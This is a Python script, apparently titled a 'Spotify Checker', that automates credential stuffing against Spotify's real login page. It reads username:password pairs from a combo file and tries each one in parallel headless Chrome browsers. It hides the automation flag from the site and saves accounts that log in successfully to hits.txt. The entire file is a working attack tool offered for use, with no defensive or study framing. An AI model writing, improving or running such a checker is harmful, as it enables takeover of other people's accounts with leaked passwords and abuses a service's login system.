from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
#from selenium.common.exceptions import WebDriverException
from time import sleep
#from multiprocessing.dummy import Pool as ThreadPool
from concurrent.futures import ThreadPoolExecutor
from colorama import init,Fore
import os

#known issue after quit not all of the chrome.exe process stops

class Main:
    def clear(self):
        if os.name == 'posix':
            os.system('clear')
        elif os.name in ('ce', 'nt', 'dos'):
            os.system('cls')
        else:
            print("\n") * 120

    def SetTitle(self,title_name:str):
        os.system("title {0}".format(title_name))

    def __init__(self):
        self.clear()
        self.SetTitle('One Man Builds Spotify Checker Selenium Tool (Proxyless)')
        self.BOLD = '\033[1m'
        init()
        self.browser_amount = int(input('[QUESTION] How many browser would you like to run at the same time: '))
        print('')

    def PrintText(self,info_name,text,info_color:Fore,text_color:Fore):
        print(self.BOLD+'{0}[{1}{2}{3}] '.format(info_color,Fore.RESET,info_name,info_color)+text_color+f'{text}\r')

    def ReadFile(self,filename,method):
        with open(filename,method) as f:
            content = [line.strip('\n') for line in f]
            return content

    def Login(self,combos):
        try:
            options = Options()
            options.add_argument('--headless')
            options.add_argument('no-sandbox')
            options.add_argument('--log-level=3')
            options.add_experimental_option('excludeSwitches', ['enable-logging','enable-automation'])
            driver = webdriver.Chrome(options=options)
            username = combos.split(':')[0]
            password = combos.split(':')[-1]
            driver.get('https://accounts.spotify.com/en/login/')
            username_elem = driver.find_element_by_id('login-username')
            username_elem.send_keys(username)
            password_elem = driver.find_element_by_id('login-password')
            password_elem.send_keys(password)
            login_button_elem = driver.find_element_by_id('login-button')
            login_button_elem.click()
            sleep(1.25)

            if driver.current_url == 'https://accounts.spotify.com/en/status':
                self.PrintText('HIT','{0}:{1}'.format(username,password),Fore.GREEN,Fore.GREEN)
                with open('hits.txt','a') as f:
                    f.write('{0}:{1}\n'.format(username,password))
            else:
                self.PrintText('BAD','{0}:{1}'.format(username,password),Fore.RED,Fore.RED)
                with open('bads.txt','a') as f:
                    f.write('{0}:{1}\n'.format(username,password))

            driver.close()
            driver.quit()
        except:
            pass
        

    def Start(self):
        combos = self.ReadFile('combos.txt','r')
        with ThreadPoolExecutor(max_workers=self.browser_amount) as ex:
            for combo in combos:
                ex.submit(self.Login,combo)


if __name__ == '__main__':
    main = Main()
    main.Start()